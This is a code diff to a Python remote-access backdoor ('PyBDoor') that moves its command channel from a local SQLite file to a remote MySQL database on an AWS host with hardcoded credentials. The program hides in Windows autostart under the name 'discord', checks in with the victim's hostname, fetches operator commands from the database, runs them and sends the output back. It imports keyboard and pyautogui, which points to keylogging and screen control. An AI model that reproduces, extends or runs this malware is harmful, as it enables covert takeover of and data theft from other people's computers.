@@ -1,4 +1,6 @@
-import sqlite3,socket,os,time,datetime,keyboard,winreg,pyautogui,webbrowser
+import mysql.connector,socket,os,time,datetime,keyboard,winreg,pyautogui,webbrowser
+
+
 pyautogui.FAILSAFE = False
 class backdoor:
     def __init__(self):
@@ -10,34 +12,41 @@ class backdoor:
 
         self.set_autostart_registry('discord', 'main.exe')
 
-        self.db = sqlite3.connect("C:/Users/armen/Documents/Github/PyBDoor/server/db.sqlite3")
+        self.db = mysql.connector.connect(
+            host="database.cun6wzt30wpz.us-west-1.rds.amazonaws.com",
+            user="admin",
+            password="databasepassword",
+            database="DB",
+        )
         self.cursor = self.db.cursor()
 
-        pcs = self.cursor.execute("SELECT * FROM backdoor_computer").fetchall()
+        self.cursor.execute("SELECT * FROM backdoor_computer")
+        pcs = self.cursor.fetchall()
         self.pc_id = None
         for pc in pcs:
-            if socket.gethostname() == pc[1]:
+            if socket.gethostname() == pc[2]:
                 self.pc_id = pc[0]
 
         if self.pc_id == None:
             sql_code = """INSERT INTO backdoor_computer
                       (pc_name, last_online)
-                      VALUES (?, ?)
+                      VALUES (%s, %s)
             """
             
             self.cursor.execute(sql_code, (socket.gethostname(),datetime.datetime.utcnow()))
             self.db.commit()
 
-            pcs = self.cursor.execute("SELECT * FROM backdoor_computer").fetchall()
+            self.cursor.execute("SELECT * FROM backdoor_computer")
+            pcs = self.cursor.fetchall()
             for pc in pcs:
-                if socket.gethostname() == pc[1]:
+                if socket.gethostname() == pc[2]:
                     self.pc_id = pc[0]
 
 
         while True:
             sql_code = """UPDATE backdoor_computer
-                        SET last_online = ?
-                        WHERE id = ?
+                        SET last_online = %s
+                        WHERE id = %s
                 """
             self.cursor.execute(sql_code, (datetime.datetime.utcnow(), self.pc_id))
             self.db.commit()
@@ -196,17 +205,18 @@ class backdoor:
 
         return output
     def command_thread(self):
-        commands = self.cursor.execute("SELECT * FROM backdoor_command").fetchall()
+        self.cursor.execute("SELECT * FROM backdoor_command")
+        commands = self.cursor.fetchall()
         for command in commands:
-            if command[1] == self.pc_id:
-                output = self.run(command[2])
+            if command[2] == self.pc_id:
+                output = self.run(command[1])
                 
                 self.cursor.execute(f"DELETE FROM backdoor_command WHERE id={str(command[0])}")
                 sql_code = """INSERT INTO backdoor_output
                       (command, output, target_id, time)                 
-                      VALUES (?, ?, ?, ?)
+                      VALUES (%s,%s,%s,%s)
                 """
-                self.cursor.execute(sql_code, (command[2], output, self.pc_id,datetime.datetime.now()))
+                self.cursor.execute(sql_code, (command[1], output, self.pc_id,datetime.datetime.now()))
                 self.db.commit()
     def set_autostart_registry(self, app_name, key_data=None, autostart: bool = True) -> bool:
         with winreg.OpenKey(
